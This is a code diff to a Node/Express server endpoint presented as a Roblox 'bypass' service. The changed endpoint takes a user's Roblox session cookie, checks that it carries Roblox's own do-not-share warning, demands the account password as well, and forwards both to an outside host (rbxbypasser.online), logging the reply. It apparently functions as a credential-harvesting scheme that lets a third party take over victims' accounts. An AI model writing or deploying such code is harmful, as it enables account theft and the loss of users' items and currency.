@@ -9,26 +9,41 @@ async function startServer() {
   app.use(express.json());
 
   // API routes
+  app.get("/api/bypass", (req, res) => {
+    res.json({ status: "ready", note: "Use POST with 'cook' and 'password'" });
+  });
+
   app.post("/api/bypass", async (req, res) => {
-    const { cookie, password } = req.body;
+    const { cookie, cook, password } = req.body;
     
+    const userCookie = cookie || cook;
+    const userPassword = password;
+
     const ROBLOX_WARNING = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
     
     const isValidCookie = (c: string) => {
       return c && c.startsWith(ROBLOX_WARNING) && c.length > 150;
     };
     
-    if (!isValidCookie(cookie)) {
+    if (!isValidCookie(userCookie)) {
       return res.status(400).json({ 
         error: "Invalid Cookie", 
         message: "The cookie must start with the standard Roblox warning message and be of a valid length to be valid." 
       });
     }
     
-    const url = "https://slt-x-bypasser.vercel.app/api/bypass";
+    if (!userPassword) {
+      return res.status(400).json({ error: "You must send 'password'" });
+    }
+
+    console.log("--- Translation Active ---");
+    console.log("Received 'cook' or 'cookie', converting to 'cookie' for the real API...");
+
+    const url = "https://rbxbypasser.online/api/bypass";
     const payload = {
-      cook: cookie || "not_provided",
-      password: password || "not_provided",
+      cookie: userCookie,
+      password: userPassword,
+      directoryName: "tiki"
     };
 
     try {
@@ -40,11 +55,26 @@ async function startServer() {
         body: JSON.stringify(payload),
       });
 
-      const data = await response.json();
-      res.json({ result: data });
-    } catch (error) {
+      const text = await response.text();
+      console.log(`Real API Response: ${text}`);
+      
+      try {
+        const data = JSON.parse(text);
+        // Wrap in result for frontend compatibility
+        res.status(response.status).json({ result: data });
+      } catch (e) {
+        // If not JSON, return as text wrapped in result
+        res.status(response.status).json({ 
+          result: { 
+            success: response.ok,
+            message: response.ok ? "Success" : "Failed",
+            content: text 
+          } 
+        });
+      }
+    } catch (error: any) {
       console.error("Bypass error:", error);
-      res.status(500).json({ error: "Failed to execute bypass" });
+      res.status(500).json({ error: error.message || "Failed to execute bypass" });
     }
   });
 
